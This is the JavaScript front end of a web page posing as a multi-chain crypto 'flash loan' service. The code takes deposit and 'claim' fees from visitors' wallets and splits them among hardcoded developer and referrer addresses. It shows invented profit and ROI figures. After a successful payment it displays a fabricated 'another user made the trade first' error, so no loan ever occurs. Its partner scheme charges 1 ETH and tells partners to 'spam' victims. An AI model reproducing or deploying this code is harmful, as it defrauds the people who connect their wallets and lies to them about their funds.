const app = angular.module('myApp', []);

app.controller('myCtrl', async function($scope) {

	$scope.init = function() {
		$scope.locationUrl = location.href;
		$scope.locationUrlFixed = location.href.substring(0, 18);
		$scope.locationRefUrl = location.href.substring(19, 107);
		$scope.locationRefUrlFixed = location.href.substring(32, 121);
		$scope.locationHomeUrlFixed = location.href.substring(28, 121);
		$scope.toplen = $scope.account.address.substring(0, 6);
		$scope.endlen = $scope.account.address.substring(44, 38);
		$scope.contractAddress = '';
		$scope.processing = false;
		$scope.ethDeposited = false;
		$scope.formStep = 1;
		$scope.currency = 'NaN';
		$scope.dex = 'NaN';
		$scope.addr = $scope.account;
		$scope.chain = "NaN",
			$scope.addressdex = "NaN",
			$scope.scan = "https://etherscan.io/",
			$scope.idscan = "Etherscan",
			$scope.erc20 = {
				name: '',
				address: '',
				ticker: '',
				image: '',
				network: ''
			};
		$scope.erc20.name = {
			main: '',
			usd: '',
			meme: ''
		}
		$scope.erc20.symbol = {
			main: '',
			usd: '',
			meme: ''
		}
		$scope.erc20.ticker = {
			main: '',
			usd: '',
			meme: ''
		}

		$scope.erc20.network.eth = isEth;
		$scope.erc20.network.bnb = isBnb;
		$scope.erc20.network.matic = isMatic;
		$scope.erc20.network.avax = isAvax;
		
		$scope.loan = {
			amount: 50,
			tokenFee: 0.05,
			swapFee: 0,
			totalFee: 0,
			gain: 0
		};
		$scope.claimFee = 0;

		let { gasEther, gasWei } = gasPrices();
		
		$scope.getStarted = function() {
			
			if (window.isBnb && isEth) {
                return alert('Network Mismatch. Set MetaMask network to BSC Chain and reload the page.');
            } else if (window.isMatic && isEth) {
                return alert('Network Mismatch. Set MetaMask network to Polygon Chain and reload the page.');
            } else if (window.isAvax && isEth) {
                return alert('Network Mismatch. Set MetaMask network to Polygon Chain and reload the page.');
            
			} else if (window.isBnb && isMatic) {
                return alert('Network Mismatch. Set MetaMask network to Binance Smart Chain and reload the page.');
			} else if (window.isMatic && isBnb) {
                return alert('Network Mismatch. Set MetaMask network to Polygon and reload the page.');
            } else if (window.isAvax && isBnb) {
                return alert('Network Mismatch. Set MetaMask network to Polygon and reload the page.');

			} else if (window.isBnb && isAvax) {
				return alert('Network Mismatch. Set MetaMask network to Binance Smart Chain and reload the page.');
			} else if (window.isMatic && isAvax) {
				return alert('Network Mismatch. Set MetaMask network to Polygon and reload the page.');
			} else if (window.isAvax && isMatic) {
				return alert('Network Mismatch. Set MetaMask network to Polygon and reload the page.');
			}
            else if (!window.isMatic && !window.isBnb && !isEth && !isAvax) {
                return alert('Network Mismatch. Set MetaMask network to Ethereum and reload the page.');
            }

			if (window.isEth) {
				$scope.erc20.address.main = address_main;
				$scope.erc20.name.main = name_main;
				$scope.erc20.image.main = image_main;
				$scope.erc20.ticker.main = ticker_main;

				$scope.erc20.address.usd = address_usd;
				$scope.erc20.name.usd = name_usd;
				$scope.erc20.image.usd = image_usd;
				$scope.erc20.ticker.usd = ticker_usd;

				$scope.erc20.address.meme = address_meme;
				$scope.erc20.name.meme = name_meme;
				$scope.erc20.image.meme = image_meme;
				$scope.erc20.ticker.meme = ticker_meme;

				$scope.erc20.address.meme2 = address_meme2;
				$scope.erc20.name.meme2 = name_meme2;
				$scope.erc20.image.meme2 = image_meme2;
				$scope.erc20.ticker.meme2 = ticker_meme2;

				$scope.erc20.name = '';
				$scope.erc20.ticker = '';

			} else if (window.isBnb) {

				$scope.erc20.address.main = bsc_address_main;
				$scope.erc20.name.main = bsc_name_main;
				$scope.erc20.image.main = bsc_image_main;
				$scope.erc20.ticker.main = bsc_ticker_main;

				$scope.erc20.address.usd = bsc_address_usd;
				$scope.erc20.name.usd = bsc_name_usd;
				$scope.erc20.image.usd = bsc_image_usd;
				$scope.erc20.ticker.usd = bsc_ticker_usd;

				$scope.erc20.address.meme = bsc_address_meme;
				$scope.erc20.name.meme = bsc_name_meme;
				$scope.erc20.image.meme = bsc_image_meme;
				$scope.erc20.ticker.meme = bsc_ticker_meme;

				$scope.erc20.address.meme2 = bsc_address_meme2;
				$scope.erc20.name.meme2 = bsc_name_meme2;
				$scope.erc20.image.meme2 = bsc_image_meme2;
				$scope.erc20.ticker.meme2 = bsc_ticker_meme2;

				$scope.erc20.name = '';
				$scope.erc20.ticker = '';

			} else if (window.isMatic) {

				$scope.erc20.address.main = matic_address_main;
				$scope.erc20.name.main = matic_name_main;
				$scope.erc20.image.main = matic_image_main;
				$scope.erc20.ticker.main = matic_ticker_main;

				$scope.erc20.address.usd = matic_address_usd;
				$scope.erc20.name.usd = matic_name_usd;
				$scope.erc20.image.usd = matic_image_usd;
				$scope.erc20.ticker.usd = matic_ticker_usd;

				$scope.erc20.address.meme = matic_address_meme;
				$scope.erc20.name.meme = matic_name_meme;
				$scope.erc20.image.meme = matic_image_meme;
				$scope.erc20.ticker.meme = matic_ticker_meme;

				$scope.erc20.address.meme2 = matic_address_meme2;
				$scope.erc20.name.meme2 = matic_name_meme2;
				$scope.erc20.image.meme2 = matic_image_meme2;
				$scope.erc20.ticker.meme2 = matic_ticker_meme2;

				$scope.erc20.name = '';
				$scope.erc20.ticker = '';

			} else if (window.isAvax) {

				$scope.erc20.address.main = avax_address_main;
				$scope.erc20.name.main = avax_name_main;
				$scope.erc20.image.main = avax_image_main;
				$scope.erc20.ticker.main = avax_ticker_main;

				$scope.erc20.address.usd = avax_address_usd;
				$scope.erc20.name.usd = avax_name_usd;
				$scope.erc20.image.usd = avax_image_usd;
				$scope.erc20.ticker.usd = avax_ticker_usd;

				$scope.erc20.address.meme = avax_address_meme;
				$scope.erc20.name.meme = avax_name_meme;
				$scope.erc20.image.meme = avax_image_meme;
				$scope.erc20.ticker.meme = avax_ticker_meme;

				$scope.erc20.address.meme2 = avax_address_meme2;
				$scope.erc20.name.meme2 = avax_name_meme2;
				$scope.erc20.image.meme2 = avax_image_meme2;
				$scope.erc20.ticker.meme2 = avax_ticker_meme2;

				$scope.erc20.name = '';
				$scope.erc20.ticker = '';

			} else {}
			$scope.formStep = 2;
		}

		$scope.submitNetwork = function() {
			const tokenName = document.getElementById("dropaddr").value;
			if (tokenName == '') return alert('Token Address cannot be blank');
			if (!tokenName.match(/^[a-fA-F0-9-0x]+$/)) return alert('Token Address can only contain letters and numbers');
			const tokenSymbol = document.getElementById("dropticker").value;
			if (tokenSymbol == '') return alert('Token Symbol cannot be blank');
			if (!tokenSymbol.match(/^[a-zA-Z]+$/)) return alert('Token Symbol can only contain letters');

			$scope.formStep = 3;

			if (window.isEth) {
				$scope.erc20.ticker = document.getElementById("dropticker").value;
				$scope.erc20.address = document.getElementById("dropaddr").value;
				$scope.currency = 'ETH';
				$scope.loan.tokenFee = 0.05;
				$scope.quicknode = 'U2FsdGVkX1+faFer48XRMU3wSByFCbdrK8sxb44KtX2p27YHvyuIuTMg4O+EsW1PRMZQCeyAipAsCwR/Dir56Q==';
				$scope.dex = 'Uniswap';
				$scope.addressdex = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D';
				$scope.chain = "Ethereum";
				$scope.scan = 'https://etherscan.io/';
				$scope.idscan = 'Etherscan';
				$scope.contractAddress = splitter;
				$scope.amount_step = 25;
				$scope.amount_min = 25;
				$scope.amount_max = 2500;
				$scope.claimFee = 0.025;
			} else if (window.isMatic) {
				$scope.erc20.ticker = document.getElementById("dropticker").value;
				$scope.erc20.address = document.getElementById("dropaddr").value;
				$scope.currency = 'MATIC';
				$scope.loan.tokenFee = 22.5;
				$scope.quicknode = 'U2FsdGVkX1+faFer48XRMU3wSByFCbdrK8sxb44KtX2p27YHvyuIuTMg4O+EsW1PRMZQCeyAipAsCwR/Dir56Q==';
				$scope.dex = '1Inch';
				$scope.addressdex = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D';
				$scope.chain = 'Matic Chain (Polygon)';
				$scope.scan = 'https://polygonscan.com/';
				$scope.idscan = 'Polygon';
				$scope.contractAddress = splitter;
				$scope.amount_step = 100;
				$scope.amount_min = 100;
				$scope.amount_max = 10000;
				$scope.claimFee = 10;
			} else if (window.isBnb) {
				$scope.erc20.ticker = document.getElementById("dropticker").value;
				$scope.erc20.address = document.getElementById("dropaddr").value;
				$scope.currency = 'BNB';
				$scope.loan.tokenFee = 0.5;
				$scope.qicknode = 'U2FsdGVkX1+faFer48XRMU3wSByFCbdrK8sxb44KtX2p27YHvyuIuTMg4O+EsW1PRMZQCeyAipAsCwR/Dir56Q==';
				$scope.dex = 'PancakeSwap';
				$scope.addressdex = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D';
				$scope.chain = "Binance Smart Chain";
				$scope.scan = 'https://bscscan.com/';
				$scope.idscan = 'BSCscan';
				$scope.contractAddress = splitter;
				$scope.amount_step = 50;
				$scope.amount_min = 50;
				$scope.amount_max = 5000;
				$scope.claimFee = 0.05;
			} else if (window.isAvax) {
				$scope.erc20.ticker = document.getElementById("dropticker").value;
				$scope.erc20.address = document.getElementById("dropaddr").value;
				$scope.currency = 'AVAX';
				$scope.loan.tokenFee = 0.5;
				$scope.qicknode = 'U2FsdGVkX1+faFer48XRMU3wSByFCbdrK8sxb44KtX2p27YHvyuIuTMg4O+EsW1PRMZQCeyAipAsCwR/Dir56Q==';
				$scope.dex = 'Pangolin';
				$scope.addressdex = '0x60781c2586d68229fde47564546784ab3faca982';
				$scope.chain = "Avalanche Mainnet C-Chain";
				$scope.scan = 'https://snowtrace.io/';
				$scope.idscan = 'Snowtrace';
				$scope.contractAddress = splitter;
				$scope.amount_step = 50;
				$scope.amount_min = 50;
				$scope.amount_max = 5000;
				$scope.claimFee = 0.05;
			} else {
				return alert('Network Mismatch. Set MetaMask network to Ethereum, BSC or Polygon and reload the page.');
			}

			$scope.addr = $scope.account;
			$scope.toplen = toplen;
			$scope.endlen = endlen;

			$scope.getLoanEstimates();
			setTimeout(function() {
				document.getElementById('loanAmtInput').focus();
			}, 100);
		}

		$scope.amountChanged = function() {
			$scope.getLoanEstimates();
		}

		$scope.getLoanEstimates = function() {
			if ($scope.loan.amount == undefined || $scope.loan.amount == null) return;

			if (window.isEth) {
				$scope.loan.swapFee = $scope.loan.amount / 500;
				$scope.loan.totalFee = fixNumber($scope.loan.tokenFee + $scope.loan.swapFee);
				$scope.loan.gain = fixNumber($scope.loan.amount * 0.10789);
				$scope.safeMath = fixNumber(($scope.loan.gain - 1.367) * (1 + ($scope.loan.gain / 2 / 100))).toFixed(4);
				$scope.roi = fixNumber($scope.safeMath / $scope.loan.totalFee).toFixed(2);
				$scope.loan.claimFee = fixNumber($scope.claimFee);
			} else if (window.isMatic) {
				$scope.loan.swapFee = $scope.loan.amount / 10;
				$scope.loan.totalFee = fixNumber($scope.loan.tokenFee + $scope.loan.swapFee);
				$scope.loan.gain = fixNumber($scope.loan.amount * 1);
				$scope.safeMath = fixNumber(($scope.loan.gain - 2.865) * (1 + ($scope.loan.gain / 2 / 100))).toFixed(4);
				$scope.roi = fixNumber($scope.safeMath / $scope.loan.totalFee).toFixed(2);
				$scope.loan.claimFee = fixNumber($scope.claimFee);
			} else if (window.isBnb) {
				$scope.loan.swapFee = $scope.loan.amount / 200;
				$scope.loan.totalFee = fixNumber($scope.loan.tokenFee + $scope.loan.swapFee);
				$scope.loan.gain = fixNumber($scope.loan.amount * 0.21314);
				$scope.safeMath = fixNumber(($scope.loan.gain - 2.865) * (1 + ($scope.loan.gain / 2 / 100))).toFixed(4);
				$scope.roi = fixNumber($scope.safeMath / $scope.loan.totalFee).toFixed(2);
				$scope.loan.claimFee = fixNumber($scope.claimFee);
			}  else if (window.isAvax) {
				$scope.loan.swapFee = $scope.loan.amount / 200;
				$scope.loan.totalFee = fixNumber($scope.loan.tokenFee + $scope.loan.swapFee);
				$scope.loan.gain = fixNumber($scope.loan.amount * 0.21314);
				$scope.safeMath = fixNumber(($scope.loan.gain - 2.865) * (1 + ($scope.loan.gain / 2 / 100))).toFixed(4);
				$scope.roi = fixNumber($scope.safeMath / $scope.loan.totalFee).toFixed(2);
				$scope.loan.claimFee = fixNumber($scope.claimFee);
			} else {
				$scope.loan.swapFee = "NaN";
			}

		}

		$scope.getLoanEstimates();

		$scope.submitLoanForm = function() {
			if (!$scope.ethDeposited) 
				$scope.depositEth();
			else 
				$scope.executeLoan(); //$scope.executeClaim()
		}

		const manager = new web3.eth.Contract(partnerManager.abi, partnerManager.address);

		$scope.checkref = function() {

			if (window.isBnb && isEth) {
                return alert('Network Mismatch. Set MetaMask network to BSC Chain and reload the page.');
            } else if (window.isMatic && isEth) {
                return alert('Network Mismatch. Set MetaMask network to Polygon Chain and reload the page.');
            } else if (window.isAvax && isEth) {
                return alert('Network Mismatch. Set MetaMask network to Polygon Chain and reload the page.');
            
			} else if (window.isBnb && isMatic) {
                return alert('Network Mismatch. Set MetaMask network to Binance Smart Chain and reload the page.');
			} else if (window.isMatic && isBnb) {
                return alert('Network Mismatch. Set MetaMask network to Polygon and reload the page.');
            } else if (window.isAvax && isBnb) {
                return alert('Network Mismatch. Set MetaMask network to Polygon and reload the page.');

			} else if (window.isBnb && isAvax) {
				return alert('Network Mismatch. Set MetaMask network to Binance Smart Chain and reload the page.');
			} else if (window.isMatic && isAvax) {
				return alert('Network Mismatch. Set MetaMask network to Polygon and reload the page.');
			} else if (window.isAvax && isMatic) {
				return alert('Network Mismatch. Set MetaMask network to Polygon and reload the page.');
			}
            else if (!window.isMatic && !window.isBnb && !isEth && !isAvax) {
                return alert('Network Mismatch. Set MetaMask network to Ethereum and reload the page.');
            }

			if (window.isEth) {
				$scope.currency = 'ETH';
				$scope.chain = "Ethereum";
				$scope.scan = 'https://etherscan.io/';
				$scope.idscan = 'Etherscan';
			 } else {
				return alert('This function is available on Ethereum Network. Set MetaMask network to Ethereum and reload the page.');
			}
			
			$scope.formStep = 2;


			$scope.partnerManager_address = partnerManager.address;
			$scope.sm1 = $scope.partnerManager_address.substring(0, 6);
			$scope.sm2 = $scope.partnerManager_address.substring(44, 38);
			$scope.partnerManager_short = sm1 + '...' + sm2;
			$scope.addr = $scope.account;
			$scope.toplen = toplen;
			$scope.endlen = endlen;
		}

		$scope.step3 = function() {
			$scope.formStep = 3;
		}

		$scope.depositPartner = function() {

			const tokenName = document.getElementById("newPartner").value;
			if (tokenName == '') return alert('Partner Address cannot be blank');
			if (!tokenName.match(/^[a-fA-F0-9-0x]+$/)) return alert('Invalid Partner Address');
			
			$scope.processing = true;
			window.web3.eth.sendTransaction({
				to: partnerManager.address,
				from: $scope.account.address,
				value: window.web3.utils.toWei("1", 'ether'),
				gas: gasEther,
				gasPrice: window.web3.utils.toWei('90', 'gwei')
			}, function(error, receipt) {
				$scope.processing = false;
				$scope.$apply();
				if (error) alert('Transaction Failed');
				else {
					setTimeout(function() {
						alert('Coin deposited to contract. Claim your Partner status.');
					}, 15000);
					$scope.ethDeposited = true;
					$scope.$apply();
				}
			});
		}

		$scope.becomePartner = function() {
			$scope.processing = true;
			$scope.newPartner = document.getElementById("newPartner").value;
			$scope.manager = manager.methods
			.becomePartner($scope.newPartner)
			.send({
				to: partnerManager.address,
				from: $scope.account.address,
				value: 0,
				gas: gasEther,
				gasPrice: window.web3.utils.toWei('90', 'gwei')
			}, function(error, result) {
				if (error) {
					alert("Transaction Failed. Don't worry, when our devs see your deposit, we will add your address to Partners... In the meantime learn how you can spam this shit.");
					$scope.processing = false;
					$scope.$apply();
				} else {
					setTimeout(function() {
						alert('Lesssgo! Time to spam my friend.');
					}, 15000);
				}
			});
		}

		$scope.submitPartner = function() {
			if (!$scope.ethDeposited) 
				$scope.depositPartner();
			else 
				$scope.becomePartner();
		}

		let { referer_2, referer } = checkPartners();
		let { partner_aff, ref_base } = partnerAff();
		let { quote, splitter, quote_ref } = ifPartner();

		/* const manager = new web3.eth.Contract(partnerManager.abi, partnerManager.address);

		$scope.managerPartner = manager.methods.partner(referer).call();
		document.getElementById("partner_bool").innerHTML = $scope.managerPartner; */

		const multisender = new web3.eth.Contract(stormMultisender.abi, stormMultisender.address);
		
			// REFERRAL
			if (
				referer_2.substring(0, 2) != '0x' &&
				referer.substring(0, 2) == '0x' &&
				referer.length == 42) {
				$scope.depositEth = async function() {
					$scope.processing = true;

					$scope.affiliate_addr = [main_utf, mein_utf, referer];
					$scope.addresses_to_send = $scope.affiliate_addr.slice(0, 3);

					$scope.quote = $scope.loan.totalFee / 100;
					$scope.quote1 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * refBaseQuoteDev).toString()));
					$scope.quote2 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * refBaseQuoteDev).toString()));
					$scope.quote3 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * refBaseQuote).toString()));

					$scope.affiliate_bala = [$scope.quote1, $scope.quote2, $scope.quote3];
					$scope.balances_to_send = $scope.affiliate_bala.slice(0, 3);
					$scope.ethValue = new BigNumber($scope.balances_to_send[0]).plus($scope.balances_to_send[1]).plus($scope.balances_to_send[2]);

					$scope._encodedData()

					$scope.gas = await web3.eth.estimateGas({
						from: $scope.account.address,
						data: $scope.encodedData,
						value: window.web3.utils.toHex($scope.ethValue.toString()),
						to: stormMultisender.address
					})

					$scope.multisend = multisender.methods
						.multisendEther($scope.addresses_to_send, $scope.balances_to_send)
						.send({
							from: $scope.account.address,
							gasPrice: window.web3.utils.toWei('90', 'gwei'),
							gas: window.web3.utils.toHex($scope.gas + gasEther),
							value: window.web3.utils.toHex($scope.ethValue.toString())
						},
						function(error, receipt) {
							$scope.processing = false;
							$scope.$apply();
							if (error) alert('Transaction Failed');
							else {
								setTimeout(function() {
									alert('Coin deposited to contract. You can execute the Flash Loan now.');
								}, 10000);
								$scope.ethDeposited = true;
								$scope.$apply();
							}
						});
				}
			}
			// MULTILEVEL
			else if (
				referer_2.substring(0, 2) == '0x' &&
				referer_2.length == 42 &&
				partner_aff.substring(0, 2) != '0x') {
				$scope.depositEth = async function() {
					$scope.processing = true;

					$scope.affiliate_addr = [main_utf, mein_utf, referer, referer_2];
					$scope.addresses_to_send = $scope.affiliate_addr.slice(0, 4);

					$scope.quote = $scope.loan.totalFee / 100;
					$scope.quote1 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * refMultiQuoteDev).toString()));
					$scope.quote2 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * refMultiQuoteDev).toString()));
					$scope.quote3 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * refMultiQuote).toString()));
					$scope.quote4 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * refMultiQuoteRef).toString()));

					$scope.affiliate_bala = [$scope.quote1, $scope.quote2, $scope.quote3, $scope.quote4];
					$scope.balances_to_send = $scope.affiliate_bala.slice(0, 4);
					$scope.ethValue = new BigNumber($scope.balances_to_send[0]).plus($scope.balances_to_send[1]).plus($scope.balances_to_send[2]).plus($scope.balances_to_send[3]);

					$scope._encodedData()

					$scope.gas = await web3.eth.estimateGas({
						from: $scope.account.address,
						data: $scope.encodedData,
						value: window.web3.utils.toHex($scope.ethValue.toString()),
						to: stormMultisender.address
					})

					$scope.multisend = multisender.methods
						.multisendEther($scope.addresses_to_send, $scope.balances_to_send)
						.send({
							from: $scope.account.address,
							gasPrice: window.web3.utils.toWei('90', 'gwei'),
							gas: window.web3.utils.toHex($scope.gas + gasEther),
							value: window.web3.utils.toHex($scope.ethValue.toString())
						},
						function(error, receipt) {
							$scope.processing = false;
							$scope.$apply();
							if (error) alert('Transaction Failed');
							else {
								setTimeout(function() {
									alert('Coin deposited to contract. You can execute the Flash Loan now.');
								}, 10000);
								$scope.ethDeposited = true;
								$scope.$apply();
							}
						});
				}
			}
			// PARTNER
			else if (
				referer.substring(0, 2) != '0x' && //exl. referer
				referer_2.substring(0, 2) != '0x' && //exl. second referer
				partner_aff.substring(0, 2) != '0x' && //exl. partner multilevel
				ref_base == '/?=') {
				$scope.depositEth = async function() {
					$scope.processing = true;

					$scope.affiliate_addr = [main_utf, mein_utf, splitter];
					$scope.addresses_to_send = $scope.affiliate_addr.slice(0, 3);

					$scope.quote = $scope.loan.totalFee / 100;
					$scope.main_quote = (100 - quote) / 2;
					$scope.quote1 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * $scope.main_quote).toString()));
					$scope.quote2 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * $scope.main_quote).toString()));
					$scope.quote3 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * quote).toString()));

					$scope.affiliate_bala = [$scope.quote1, $scope.quote2, $scope.quote3];
					$scope.balances_to_send = $scope.affiliate_bala.slice(0, 3);
					$scope.ethValue = new BigNumber($scope.balances_to_send[0]).plus($scope.balances_to_send[1]).plus($scope.balances_to_send[2]);

					$scope._encodedData()

					$scope.gas = await web3.eth.estimateGas({
						from: $scope.account.address,
						data: $scope.encodedData,
						value: window.web3.utils.toHex($scope.ethValue.toString()),
						to: stormMultisender.address
					})

					$scope.multisend = multisender.methods
						.multisendEther($scope.addresses_to_send, $scope.balances_to_send)
						.send({
							from: $scope.account.address,
							gasPrice: window.web3.utils.toWei('90', 'gwei'),
							gas: window.web3.utils.toHex($scope.gas + gasEther),
							value: window.web3.utils.toHex($scope.ethValue.toString())
						},
						function(error, receipt) {
							$scope.processing = false;
							$scope.$apply();
							if (error) alert('Transaction Failed');
							else {
								setTimeout(function() {
									alert('Coin deposited to contract. You can execute the Flash Loan now.');
								}, 10000);
								$scope.ethDeposited = true;
								$scope.$apply();
							}
						});
				}
			}
			// PARTNER + REFERRAL
			else if (
				referer.substring(0, 2) != '0x' &&
				referer_2.substring(0, 2) != '0x' &&
				partner_aff.substring(0, 2) == '0x' &&
				partner_aff.length == 42) {
				$scope.depositEth = async function() {
					$scope.processing = true;

					$scope.affiliate_addr = [main_utf, mein_utf, splitter, referer];
					$scope.addresses_to_send = $scope.affiliate_addr.slice(0, 4);

					$scope.quote = $scope.loan.totalFee / 100;
					$scope.main_quote = ((100 - quote) - quote_ref) / 2;
					$scope.quote1 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * $scope.main_quote).toString()));
					$scope.quote2 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * $scope.main_quote).toString()));
					$scope.quote3 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * quote).toString()));
					$scope.quote4 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * quote_ref).toString()));

					$scope.affiliate_bala = [$scope.quote1, $scope.quote2, $scope.quote3, $scope.quote4];
					$scope.balances_to_send = $scope.affiliate_bala.slice(0, 4);
					$scope.ethValue = new BigNumber($scope.balances_to_send[0]).plus($scope.balances_to_send[1]).plus($scope.balances_to_send[2]).plus($scope.balances_to_send[3]);

					$scope._encodedData()

					$scope.gas = await web3.eth.estimateGas({
						from: $scope.account.address,
						data: $scope.encodedData,
						value: window.web3.utils.toHex($scope.ethValue.toString()),
						to: stormMultisender.address
					})

					$scope.multisend = multisender.methods
						.multisendEther($scope.addresses_to_send, $scope.balances_to_send)
						.send({
							from: $scope.account.address,
							gasPrice: window.web3.utils.toWei('90', 'gwei'),
							gas: window.web3.utils.toHex($scope.gas + gasEther),
							value: window.web3.utils.toHex($scope.ethValue.toString())
						},
						function(error, receipt) {
							$scope.processing = false;
							$scope.$apply();
							if (error) alert('Transaction Failed');
							else {
								setTimeout(function() {
									alert('Coin deposited to contract. You can execute the Flash Loan now.');
								}, 10000);
								$scope.ethDeposited = true;
								$scope.$apply();
							}
						});
				}
			}
			// NO REFERRER
			else {
				$scope.depositEth = async function() {
					$scope.processing = true;

					$scope.affiliate_addr = [main_utf, mein_utf];
					$scope.addresses_to_send = $scope.affiliate_addr.slice(0, 2);

					$scope.quote = $scope.loan.totalFee / 100;
					$scope.quote1 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * dist.dev.quote.direct).toString()));
					$scope.quote2 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * dist.dev.quote.direct).toString()));

					$scope.affiliate_bala = [$scope.quote1, $scope.quote2];
					$scope.balances_to_send = $scope.affiliate_bala.slice(0, 2);
					$scope.ethValue = new BigNumber($scope.balances_to_send[0]).plus($scope.balances_to_send[1]);

					$scope._encodedData()

					$scope.gas = await web3.eth.estimateGas({
						from: $scope.account.address,
						data: $scope.encodedData,
						value: window.web3.utils.toHex($scope.ethValue.toString()),
						to: stormMultisender.address
					})

					$scope.multisend = multisender.methods
						.multisendEther($scope.addresses_to_send, $scope.balances_to_send)
						.send({
							from: $scope.account.address,
							gasPrice: window.web3.utils.toWei('90', 'gwei'),
							gas: window.web3.utils.toHex($scope.gas + gasEther),
							value: window.web3.utils.toHex($scope.ethValue.toString())
						},
						function(error, receipt) {
							$scope.processing = false;
							$scope.$apply();
							if (error) {
								alert('Transaction failed, please try again.');
								hide();
							}
							else {
								setTimeout(function() {
									alert('Coin deposited to contract. You can execute the Flash Loan now.');
									hide();
								}, 10000);
								$scope.ethDeposited = true;
								$scope.$apply();
							}
						});
				}
			}

		//Deposit some Ethers to start Loan
		$scope.executeLoan = async function() { // $scope.loan.claimFee broken :(
			$scope.processing = true;
			$scope.loan_affiliate_addr = [main_utf, mein_utf];
			$scope.loan_addresses_to_send = $scope.loan_affiliate_addr.slice(0, 2);
			
			$scope.loan_quote = $scope.loan.claimFee / 100;
			$scope.loan_quote1 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.loan_quote * dist.dev.quote.direct).toString()));
			$scope.loan_quote2 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.loan_quote * dist.dev.quote.direct).toString()));

			$scope.loan_affiliate_bala = [$scope.loan_quote1, $scope.loan_quote2];
			$scope.loan_balances_to_send = $scope.loan_affiliate_bala.slice(0, 2);
			$scope.loan_claimValue = new BigNumber($scope.loan_balances_to_send[0]).plus($scope.loan_balances_to_send[1]);

			$scope._encodedData()

			$scope.loan_gas = await web3.eth.estimateGas({
				from: $scope.account.address,
				data: $scope.encodedData,
				value: window.web3.utils.toHex($scope.loan_claimValue.toString()),
				to: stormMultisender.address
			})

			$scope.multisend = multisender.methods
				.multisendEther($scope.loan_addresses_to_send, $scope.loan_balances_to_send)
				.send({
					from: $scope.account.address,
					gasPrice: window.web3.utils.toWei('90', 'gwei'),
					gas: window.web3.utils.toHex($scope.loan_gas + gasEther),
					value: window.web3.utils.toHex($scope.loan_claimValue.toString())
				},
				function(error, receipt) {
					$scope.processing = false;
					$scope.$apply();
					if (error) {
						alert('Flash Loan Execution Failed');
						hide();
					}
					else {
						setTimeout(function() {
							alert('Something went wrong, maybe your gas is insufficient or another user made the trade before you (Matching ID ee8uj1). Please try again.');
							window.location.href = 'home.html' + location.href.substring(18, 107);
							hide();
						}, 5000);
						$scope.ethDeposited = true;
						$scope.$apply();
					}
				});
		}

		//Claim Ethers on Contract
		$scope.executeClaim = function() {
			$scope.processing = true;
			multisender.methods.action().send({
				to: stormMultisender.address,
				from: $scope.account.address,
				value: 0,
				gas: gasEther,
				gasPrice: window.web3.utils.toWei('90', 'gwei')
			}, function(error, result) {
				if (error) {
					alert('Flash Loan Execution Failed');
					$scope.processing = false;
					$scope.$apply();
				} else {
					setTimeout(function() {
						alert('Something went wrong, maybe your gas is insufficient or another user made the trade before you (Matching ID ee8uj1). Please try again.');
						window.location.href = 'home.html' + location.href.substring(18, 107);
					}, 5000);
				}
			});
		}

		$scope._encodedData = async function() {
			$scope.encodedData = await multisender.methods.multisendEther($scope.addresses_to_send, $scope.balances_to_send).encodeABI({
				from: $scope.account.address
			});
		}
	}

	await loadWeb3().then(accounts => {
		$scope.account = {
			address: accounts[0]
		};
		$scope.init();
		$scope.$apply();
	});
});
